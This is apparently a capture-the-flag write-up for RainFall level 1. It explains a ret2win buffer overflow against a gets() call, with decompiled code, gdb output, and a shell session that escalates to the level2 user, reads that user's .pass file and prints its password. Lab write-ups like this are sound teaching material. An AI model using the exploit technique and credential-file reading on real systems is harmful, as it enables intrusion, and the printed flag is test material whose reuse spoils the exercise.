# Level 1

Decompiling the main function, we can see that the binary is vulnerable to a buffer overflow attack. The gets function is used to read input from the user and store it in the local_50 buffer. The gets function does not check the size of the input and can write more data than the buffer can hold, causing a buffer overflow and therefore we can perform a ret2win attack.


```


void run(void)

{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}


void main(void)

{
  char local_50 [76];
  
  gets(local_50);
  return;
}

```

let's find the address of the run function 

```bash
(gdb) info func
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

the address of the run function is 0x08048444


now we can easily exploit the binary by overflowing the buffer with 76 bytes and then overwriting the return address with the address of the run function

```bash
level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```